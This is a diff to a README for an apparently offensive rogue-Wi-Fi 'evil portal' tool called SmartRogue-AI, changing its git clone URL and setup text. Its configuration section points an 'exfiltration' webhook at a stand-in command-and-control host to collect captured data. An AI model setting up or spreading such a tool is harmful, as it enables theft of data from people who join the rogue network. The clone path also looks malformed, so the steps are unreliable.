@@ -76,13 +76,14 @@ SmartRogue-AI/
 
 ### 📥 Installation
 ```bash
-git clone https://github.com/your-repo/SmartRogue-AI.git
+git clone https://github.com/hak5/wifipineapplepager-payloads/library/user/evil_portal/SmartRogue-AI.git
+
 cd SmartRogue-AI
 chmod +x payload.sh
 ```
 
 ### ⚙️ Configuration
-Edit `config.yaml` to point to your command-and-control (C2) webhook:
+Edit `config.yaml` to point to your command-and-control (C2) webhook, example:
 ```yaml
 exfiltration:
   webhook_url: "https://your-c2-server.com/api/collect"
